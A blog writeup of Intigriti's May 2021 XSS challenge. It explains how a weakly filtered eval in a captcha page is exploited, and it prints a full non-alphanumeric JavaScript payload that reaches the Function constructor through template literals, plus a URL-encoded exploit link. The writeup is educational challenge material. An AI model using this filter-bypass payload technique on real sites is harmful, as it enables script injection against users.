---
layout: post
title:  "May Xss Challenge Intigriti Writeup"
date:   2021-06-07 15:00:00 +0100
categories: writeup Intigriti 
---

### Introduction

From the main site we can see that the captcha logic is processed by the `/captcha.php` site. This end point ends up being vulnerable to rXss. Another thing to note is that we can control the content of the input box and  the content of the "b" box (which contains the plus sign) by passing `b` and `c` parameters to the site trough a `GET` request.

So let's look at the code. At some point after clicking the `submit` button this code is executed:
     
	function calc() {
		const operation = a.innerText + b.innerText + c.value;
		if (!operation.match(/[a-df-z<>()!\\='"]/gi)) { // Allow letter 'e' because: https://en.wikipedia.org/wiki/E_(mathematical_constant)
			if (d.innerText == eval(operation)) {
				alert("🚫🤖 Congratulations, you're not a robot!");
			}
			else {
				alert("🤖 Sorry to break the news to you, but you are a robot!");
			}
		setNewNumber();
		}
		c.value = "";
	}
	
	
The content of  the `a` box ,`b` box   and `c`box is joined together, and after a quick regex to check for illegal characters its **directly executed**  via `eval`. It's worth noticing that the illegal characters check is not too strict. In fact all characters that I ended up using for the final payload are allowed : `e`,`[`,`]`,`` ` ``,`$`,`{`,`}`,`;`,`+`. (Also numbers are allowed)

>Note: The majority of the tricks I used here come from @garethheyes research about [executing non alphanumeric javascript without parenthesis](https://portswigger.net/research/executing-non-alphanumeric-javascript-without-parenthesis)

### How the exploit works

By passing `b=;` as a parameter, everything in the `input` box controlled by the `c` parameter is executed. That's because `;` after a number terminates the line immediately but it's still valid javascript. 
The trick here is crafting the javascript strings `"constructor"` and `"find"`. After doing that We can access The `Function` constructor with the following: `[]["find"]["constructor"]`.  Now we can execute  javascript by using[ template literals](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals) as a [calling convention](https://wesbos.com/tagged-template-literals) and also to construct the string of arbitrary code that we want to execute. 
At the end we are calling something that looks like this ```` []["find"]["constructor"]`e${"ale"+"rt(document.domain)"}``` ```` . 

The `e` character before the dollar sign `$` is necessary because for some reason using template literals this way, the string constructed inside it is passed as second argument to the `Function` constructor and whatever comes before (the `e` in this case) is passed as the first argument.

### Constructing The Strings

We already now we can't use strings directly because we basically have no direct access to alphabetic characters. The way to go here is to construct some default strings like `"undefined"` and accessing individual characters with square brackets notation. Here are the `default` strings I used:

	*  [2e500-2e500+[]] //Gives `"Nan"`
	*  [e.e+[]][0] //Gives `"Undefined"`
	*  [e+[]][0]  //Gives `"[object HTMLProgressElement]"`
	*  [[][[e.e+[]][0][4]+[e.e+[]][0][5]+[e.e+[]][0][6]+[e.e+[]][0][8]]+[]]  //Gives `"function find() { [native code] }"`
	
This works because `e` is used in [scientific notation](https://www.java2s.com/Tutorials/Javascript/Javascript_Tutorial/Data_Type/How_to_write_Scientific_notation_literal_in_Javascript.htm) as an exponential but it's also an `object` in the document( The `ProgressBar` has id=e ). For example to generate `undefined`  an unexisting propriety of `e` is accessed by doing `e.e`, after that it's converted to string using the plus sign (`e.e+[]`). To keep individual characters separated, this is enclosed in square brackets (`[e.e+[]]`), creating an array of one string. The first and only element of this array is the string `"undefined"`so we access it with `[e.e+[]][0]`. The other strings are generated using similar tricks.

### The final exploit

So we now have the ability to generate alphabetic characters and more (like the `(` and `)` characters) . By combining this with what I discussed earlier we can craft the final payload. Here is mine:

	[][[e.e+[]][0][4]+[e.e+[]][0][5]+[e.e+[]][0][6]+[e.e+[]][0][8]][[e+[]][0][5]+[e+[]][0][1]+[e+[]][0][25]+[e+[]][0][18]+[e+[]][0][26]+[e+[]][0][16]+[e.e+[]][0][0]+[e+[]][0][5]+[e+[]][0][6]+[e+[]][0][1]+[e+[]][0][16]]`e${[2e500-2e500+[]][0][1]+[e+[]][0][21]+[e+[]][0][4]+[e+[]][0][13]+[e+[]][0][26]+[[][[e.e+[]][0][4]+[e.e+[]][0][5]+[e.e+[]][0][6]+[e.e+[]][0][8]]+[]][0][13]+[e.e+[]][0][2]+[e+[]][0][1]+[e+[]][0][5]+[e.e+[]][0][0]+[e+[]][0][23]+[e.e+[]][0][3]+[e.e+[]][0][1]+[e+[]][0][6]+`.`+[e.e+[]][0][2]+[e+[]][0][1]+[e+[]][0][23]+[2e500-2e500+[]][0][1]+[e.e+[]][0][5]+[e.e+[]][0][1]+[[][[e.e+[]][0][4]+[e.e+[]][0][5]+[e.e+[]][0][6]+[e.e+[]][0][8]]+[]][0][14]}```
	
This is valid javascript and can be tested by directly executing it on the page using Developer Tools.
By [URL encoding](https://meyerweb.com/eric/tools/dencoder/) the payload and passing it as the `c` parameter we are able to craft the final malicious link:

	https://challenge-0521.intigriti.io/captcha.php?b=;&c=%5B%5D%5B%5Be.e%2B%5B%5D%5D%5B0%5D%5B4%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B6%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B8%5D%5D%5B%5Be%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B25%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B18%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B26%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B16%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B0%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B6%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B16%5D%5D%60e%24%7B%5B2e500-2e500%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B21%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B4%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B13%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B26%5D%2B%5B%5B%5D%5B%5Be.e%2B%5B%5D%5D%5B0%5D%5B4%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B6%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B8%5D%5D%2B%5B%5D%5D%5B0%5D%5B13%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B2%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B0%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B23%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B3%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B6%5D%2B%60.%60%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B2%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B23%5D%2B%5B2e500-2e500%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5B%5B%5D%5B%5Be.e%2B%5B%5D%5D%5B0%5D%5B4%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B6%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B8%5D%5D%2B%5B%5D%5D%5B0%5D%5B14%5D%7D%60%60%60
	
Visit it by clicking [here](https://challenge-0521.intigriti.io/captcha.php?b=;&c=%5B%5D%5B%5Be.e%2B%5B%5D%5D%5B0%5D%5B4%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B6%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B8%5D%5D%5B%5Be%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B25%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B18%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B26%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B16%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B0%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B6%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B16%5D%5D%60e%24%7B%5B2e500-2e500%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B21%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B4%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B13%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B26%5D%2B%5B%5B%5D%5B%5Be.e%2B%5B%5D%5D%5B0%5D%5B4%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B6%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B8%5D%5D%2B%5B%5D%5D%5B0%5D%5B13%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B2%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B0%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B23%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B3%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B6%5D%2B%60.%60%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B2%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5Be%2B%5B%5D%5D%5B0%5D%5B23%5D%2B%5B2e500-2e500%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5B%5B%5D%5B%5Be.e%2B%5B%5D%5D%5B0%5D%5B4%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B6%5D%2B%5Be.e%2B%5B%5D%5D%5B0%5D%5B8%5D%5D%2B%5B%5D%5D%5B0%5D%5B14%5D%7D%60%60%60). After opening the link, clicking on `submit` and waiting just a moment for the progress bar to load, an alert pops up.

